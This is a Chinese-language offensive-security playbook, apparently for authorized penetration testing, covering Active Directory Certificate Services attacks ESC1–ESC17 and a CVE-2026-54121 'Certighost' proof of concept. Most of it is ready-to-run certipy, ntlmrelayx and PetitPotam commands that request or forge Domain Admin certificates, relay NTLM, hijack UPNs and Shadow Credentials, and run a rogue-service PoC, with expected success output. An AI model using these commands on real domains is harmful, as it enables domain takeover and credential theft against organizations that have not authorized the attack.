# ADCS 证书攻击 (ESC1-ESC17 + CVE-based ADCS)

工具：certipy (Kali) / Certify.exe (Windows)

现代ADCS先做状态门控：

```
ESC1-14       → 主要由模板/CA/映射配置决定
ESC15         → CVE-2024-49019，Nov 2024补丁门控
ESC16         → CA全局Security Extension配置 + DC映射模式
ESC17         → Server Authentication primitive，需要后续服务
Certighost    → CVE-2026-54121，2026-07补丁门控
```

不要把 `certipy find -vulnerable` 的一个编号直接等同于“已经可以DA”；按下面前置条件继续。

---

## 枚举

```
# Certipy（推荐，Kali）
certipy find -u jen -p 'pass' -dc-ip DC-IP -vulnerable
# 当前版本可标出ESC1-ESC17；同时看CA/模板/Enrollment Rights/EKU/SAN/安全扩展/Remarks

# Certify（Windows）
.\Certify.exe find /vulnerable

# BloodHound CE自动标ADCSESC*边
```

---

## ESC1（最常见：模板允许指定SAN）

条件：模板允许 CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT（请求者可指定Subject Alternative Name）+ 低权限用户可enrollment。

```
# 请求DA证书
certipy req -u jen -p 'pass' -ca CORP-CA -template VulnTemplate \
    -upn administrator@corp.com -dc-ip DC-IP

# 用证书认证拿TGT+hash
certipy auth -pfx administrator.pfx -dc-ip DC-IP
# → NT hash / TGT
```

## ESC2（模板允许Any Purpose）

同ESC1方式请求，证书可用于任何用途。

## ESC3（Certificate Request Agent + 另一个模板）

```
# 1. 用ESC3模板请求Agent证书
certipy req -u jen -p 'pass' -ca CORP-CA -template AgentTemplate

# 2. 用Agent证书代表DA请求另一个模板的证书
certipy req -u jen -p 'pass' -ca CORP-CA -template UserTemplate \
    -on-behalf-of 'corp\administrator' -pfx agent.pfx
```

## ESC4（模板ACL可写）

条件：对模板有WriteDACL/WriteProperty → 改模板配置使其变成ESC1。

```
certipy template -u jen -p 'pass' -template VulnTemplate \
    -save-old -dc-ip DC-IP
# 改模板使其允许SAN → 按ESC1打 → 改回去
```

## ESC5（PKI对象/CA主机控制）

ESC5不是单一模板flag，而是攻击者对PKI相关高价值对象/主机获得控制，例如：

```
CA服务器本地管理员/SYSTEM
CA私钥/备份权限
Enrollment Services / NTAuthCertificates / AIA / CDP等PKI对象的危险ACL
```

如果已经取得CA私钥PFX，可直接进入Golden Certificate/forge路径：

```
certipy forge -ca-pfx CORP-CA.pfx \
  -upn administrator@corp.com \
  -sid S-1-5-21-...-500 \
  -crl 'ldap:///'

certipy auth -pfx administrator_forged.pfx -dc-ip DC-IP
```

没有CA/PKI对象控制时，不因为“环境有ADCS”就判ESC5。

## ESC6（CA允许SAN，即EDITF_ATTRIBUTESUBJECTALTNAME2）

```
# CA级别允许所有模板指定SAN → 任意模板都能像ESC1一样利用
certipy req -u jen -p 'pass' -ca CORP-CA -template User \
    -upn administrator@corp.com
```

## ESC7（CA ACL可写：ManageCA/ManageCertificates）

```
# 有ManageCA → 启用ESC6的flag
certipy ca -u jen -p 'pass' -ca CORP-CA -enable-template SubCA -dc-ip DC-IP

# 有ManageCertificates → 审批被拒的证书请求
certipy ca -u jen -p 'pass' -ca CORP-CA -issue-request <requestID>
```

## ESC8（HTTP enrollment端点NTLM relay）

```
# 1. 发现HTTP enrollment
certipy find ... # 看 Web Enrollment 是否启用

# 2. Relay NTLM到enrollment端点
impacket-ntlmrelayx -t http://CA-IP/certsrv/certfnsh.asp \
    -smb2support --adcs --template DomainController

# 3. 逼DC认证（PetitPotam/printerbug等）
python3 PetitPotam.py <relay-IP> <DC-IP>

# 4. 拿到DC证书 → 认证
certipy auth -pfx dc.pfx -dc-ip DC-IP
```

---

## 通用：证书→hash→域

```
# 拿到pfx后
certipy auth -pfx victim.pfx -dc-ip DC-IP
# 输出NT hash → PTH / DCSync / Golden Ticket
```

---

## ESC9 — No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION)

条件：模板设置 msPKI-Enrollment-Flag 含 CT_FLAG_NO_SECURITY_EXTENSION → 证书中不嵌入 szOID_NTDS_CA_SECURITY_EXT，导致 StrongCertificateBindingEnforcement 无效。

```
# 攻击者有GenericWrite on User → 改userPrincipalName为管理员 → 用ESC9模板请求证书
certipy account -u 'attacker@corp.com' -p 'pass' -dc-ip DC-IP -user victim -upn administrator update
certipy req -u victim@corp.com -p 'victim-pass' -dc-ip DC-IP -target CA.corp.com -ca CORP-CA -template VulnTemplate
certipy account -u 'attacker@corp.com' -p 'pass' -dc-ip DC-IP -user victim -upn victim@corp.com update    # 改回
certipy auth -pfx administrator.pfx -dc-ip DC-IP
```

## ESC10 — Weak Certificate Mapping

条件：注册表 CertificateMappingMethods 含 0x4 (UPN mapping) 或 StrongCertificateBindingEnforcement=0。

```
# 利用方式同ESC9但不需要CT_FLAG_NO_SECURITY_EXTENSION
# 关键：DC未强制强证书绑定
certipy account -u 'attacker@corp.com' -p 'pass' -dc-ip DC-IP -user victim -upn administrator update
certipy req -u victim@corp.com -p 'victim-pass' -dc-ip DC-IP -target CA.corp.com -ca CORP-CA -template User
certipy auth -pfx administrator.pfx -dc-ip DC-IP
```

## ESC11 — NTLM Relay to ICPR (RPC)

条件：CA未启用 IF_ENFORCEENCRYPTICERTREQUEST → ICPR接口接受未加密NTLM认证。

```
# 类似ESC8但走RPC而非HTTP
certipy relay -ca CA-IP -template DomainController
# 配合PetitPotam强制DC认证
python3 PetitPotam.py KALI-IP DC-IP
# → 拿到DC证书
```

## ESC12 — YubiHSM2特定本机场景

状态：**SPECIAL-CONTEXT**，不是普通远程模板配置错误。

条件：

```
CA私钥由YubiHSM2保护
+
已经在CA主机取得低权限shell
+
对应YubiHSM2/KSP软件栈存在可利用弱点
```

Certipy不能像ESC1/15那样直接检测和一键利用ESC12。发现CA使用YubiHSM2时记录HSM/KSP/驱动/固件版本，转入CA主机安全测试。

如果其他手段最终获得CA signing key PFX，后续可按CA完全控制处理：

```
certipy forge -ca-pfx CORP-CA.pfx \
  -upn administrator@corp.com \
  -sid S-1-5-21-...-500 \
  -crl 'ldap:///'
```

不要把“发现YubiHSM2”直接报成ESC12可利用。

## ESC13 — Issuance Policy OID Group Link

条件：证书模板关联了发行策略OID，该OID链接到一个高权限组。

```
# 枚举
certipy find -u user -p pass -dc-ip DC-IP -vulnerable
# 找 msPKI-Certificate-Policy → 指向OID → 查OID的 msDS-OIDToGroupLink

# 利用：请求含该策略的证书 → 认证时自动加入链接的组
certipy req -u user -p pass -ca CORP-CA -template VulnTemplate
certipy auth -pfx user.pfx
# 认证后用户自动获得目标组权限
```

## ESC14 — Explicit Certificate Mapping

条件：用户对象的 altSecurityIdentities 属性可被篡改。

```
# 攻击者有GenericWrite on User
# 写入altSecurityIdentities指向自己的证书
# 之后用自己的证书以目标用户身份认证
```


---

## ESC15 — Application Policy Injection / EKUwu

CVE：**CVE-2024-49019**

状态：**PRE-PATCH / VERSION-GATED**。CA已安装2024年11月对应更新时，不进入直接利用。

条件：

```
Schema Version 1模板
+
Enrollee Supplies Subject = True
+
当前主体可Enroll
+
CA未修补CVE-2024-49019
```

### 枚举

```
certipy find -u attacker@corp.local -p 'Passw0rd!' -dc-ip DC-IP -vulnerable
```

关注：

```
Schema Version                : 1
Enrollee Supplies Subject     : True
User Enrollable Principals    : 当前主体/所在组
Vulnerabilities               : ESC15
Remarks                       : patch相关提示
```

### 路线A：注入Client Authentication

目标：V1 WebServer类模板本来只允许Server Authentication，通过CSR注入Client Authentication Application Policy。

```
certipy req \
  -u 'attacker@corp.local' -p 'Passw0rd!' \
  -dc-ip DC-IP -target 'CA.corp.local' \
  -ca 'CORP-CA' -template 'WebServer' \
  -upn 'administrator@corp.local' \
  -sid 'S-1-5-21-...-500' \
  -application-policies 'Client Authentication'
```

成功输出重点：

```
Successfully requested certificate
Got certificate with UPN 'administrator@corp.local'
Certificate object SID is 'S-1-5-21-...-500'
Saving ... administrator.pfx
```

如果目标走Schannel/LDAPS：

```
certipy auth -pfx administrator.pfx -dc-ip DC-IP -ldap-shell
```

成功：

```
Authenticated ... as CORP\Administrator
```

### 路线B：注入Certificate Request Agent

先拿Agent证书：

```
certipy req \
  -u 'attacker@corp.local' -p 'Passw0rd!' \
  -dc-ip DC-IP -target 'CA.corp.local' \
  -ca 'CORP-CA' -template 'WebServer' \
  -application-policies 'Certificate Request Agent'
```

得到 `attacker.pfx` 后，代表目标申请：

```
certipy req \
  -u 'attacker@corp.local' -p 'Passw0rd!' \
  -dc-ip DC-IP -target 'CA.corp.local' \
  -ca 'CORP-CA' -template 'User' \
  -pfx attacker.pfx \
  -on-behalf-of 'CORP\Administrator'
```

再认证：

```
certipy auth -pfx administrator.pfx -dc-ip DC-IP
```

失败排查：

```
CA已修补              → 直接ESC15关闭
模板不是Schema V1     → 不符合ESC15
不能Supply Subject    → 目标身份注入条件不足
无Enroll              → 不能申请
```

---

## ESC16 — CA全局禁用SID Security Extension

状态：**CONFIGURATION-GATED**。

核心：CA的 `DisableExtensionList` 包含：

```
1.3.6.1.4.1.311.25.2    # szOID_NTDS_CA_SECURITY_EXT
```

结果是该CA签发的证书全局缺少SID Security Extension。

### 枚举

```
certipy find -u attacker@corp.local -p 'Passw0rd!' -dc-ip DC-IP -vulnerable
```

重点：

```
Disabled Extensions : 1.3.6.1.4.1.311.25.2
Vulnerabilities     : ESC16
```

### 路线A：UPN manipulation

要求：对一个可认证victim账户有GenericWrite，且DC处于允许该映射链的模式。

先保存原UPN：

```
certipy account \
  -u 'attacker@corp.local' -p 'Passw0rd!' \
  -dc-ip DC-IP -user victim read
```

改UPN为目标的sAMAccountName：

```
certipy account \
  -u 'attacker@corp.local' -p 'Passw0rd!' \
  -dc-ip DC-IP -upn administrator \
  -user victim update
```

如果没有victim自身密码，但有GenericWrite，可用Shadow Credentials临时取得其认证材料：

```
certipy shadow \
  -u 'attacker@corp.local' -p 'Passw0rd!' \
  -dc-ip DC-IP -account victim auto
```

得到 `victim.ccache` 后：

```
export KRB5CCNAME=victim.ccache

certipy req \
  -k -dc-ip DC-IP \
  -target CA.corp.local -ca CORP-CA \
  -template User
```

成功证书应体现：

```
Got certificate with UPN 'administrator@corp.local'
Certificate has no object SID
```

**立即恢复UPN：**

```
certipy account \
  -u 'attacker@corp.local' -p 'Passw0rd!' \
  -dc-ip DC-IP -upn 'victim@corp.local' \
  -user victim update
```

然后认证：

```
certipy auth \
  -dc-ip DC-IP \
  -pfx administrator.pfx \
  -username administrator \
  -domain corp.local
```

### 路线B：ESC16 + ESC6

如果同一CA还允许请求属性注入SAN，可结合目标UPN/SID URL。该链和DC强绑定模式相关，优先按当前Certipy `find` 的Remarks和官方ESC6/16逻辑判断，不因为“ESC16存在”就直接请求DA证书。

---

## ESC17 — Enrollee-Supplied Subject for Server Authentication

状态：**CHAIN-ONLY / SERVICE-GATED**。

条件：

```
Enrollee Supplies Subject = True
Server Authentication / Any Purpose / 等可做服务器TLS身份的用途
当前主体可Enroll
Manager Approval = False
Authorized Signatures = 0
```

### 枚举

```
certipy find -u attacker@corp.local -p 'Passw0rd!' -dc-ip DC-IP -vulnerable
```

### 请求目标服务器证书

例如冒充WSUS：

```
certipy req \
  -u 'attacker@corp.local' -p 'Passw0rd!' \
  -dc-ip DC-IP -target 'CA.corp.local' \
  -ca 'CORP-CA' -template 'VulnTemplate' \
  -dns 'wsus.corp.local'
```

成功：

```
Got certificate with DNS Host Name 'wsus.corp.local'
Saving ... wsus.pfx
```

### 重要判断

```
拿到wsus.pfx ≠ 拿到Administrator/DA
```

还必须存在实际消费该Server Authentication身份的服务：

```
WSUS
内部TLS管理服务
软件分发/部署系统
其他信任企业PKI服务器身份的协议
```

没有可利用service consumer时，只记录ESC17证书身份冒充primitive，不升级为“已提权”。

---

# CVE-based ADCS

## Certighost — CVE-2026-54121

状态：**PRE-PATCH / VERSION-GATED**。

公开PoC：`aniqfakhrul/CVE-2026-54121`

2026年7月更新后的PoC支持CA本身运行在DC上，并处理ESC6/SAN相关兼容情况。

### 前置

```
Enterprise CA可访问
目标CA未安装CVE-2026-54121对应2026-07修复
攻击机能监听TCP/389和445
低权限域凭据
```

PoC默认会创建一个类似 `GHOSTABCDEFGH$` 的computer account（也可通过PoC参数复用已有机器账户）。

### 安装

```
git clone https://github.com/aniqfakhrul/CVE-2026-54121.git
cd CVE-2026-54121

sudo pip install --break-system-packages \
  git+https://github.com/fortra/impacket.git \
  cryptography pyasn1 asn1crypto pycryptodome dnspython
```

### 执行

必须root，因为PoC监听389/445：

```
sudo python3 certighost.py \
  -d corp.local \
  -u jen \
  -p 'Password123!' \
  --dc-ip DC-IP
```

成功输出/产物：

```
*.pfx
*.ccache
```

PoC内部完成：

```
创建/复用机器账户
→ rogue SMB/LSA + LDAP
→ CA回连
→ 将目录查询响应替换成目标DC身份
→ CA签发目标DC证书
→ PKINIT
→ 保存PFX + CCACHE，并尝试取得NT hash
```

验证：

```
ls -l *.pfx *.ccache
export KRB5CCNAME=<generated.ccache>
klist
```

### 失败判断

```
CA已打2026-07补丁      → 关闭该CVE路径
389/445无法监听/冲突    → PoC无法建立rogue服务
目标不是Enterprise CA   → 重新确认ADCS结构
机器账户创建受限        → 考虑PoC支持的已有computer account参数，不能直接判漏洞不存在
```

### 清理

PoC可能创建 `GHOSTXXXXXXXX$` 机器账户。执行前记录PoC输出中的实际账户名；靶场测试结束后删除/恢复本次创建的计算机对象。不要清理不确定是否属于本次测试的现有机器账户。

---

## 现代ADCS决策速查

```
certipy find
  ↓
ESC15?
  → 先查Nov 2024补丁 → 未修补才利用

ESC16?
  → 看Disabled Extensions + DC mapping + 可写victim/ESC6组合

ESC17?
  → 先找WSUS/其他Server Auth消费者 → 再申请服务器证书

Enterprise CA + 2026-07未修补?
  → Certighost PoC
```
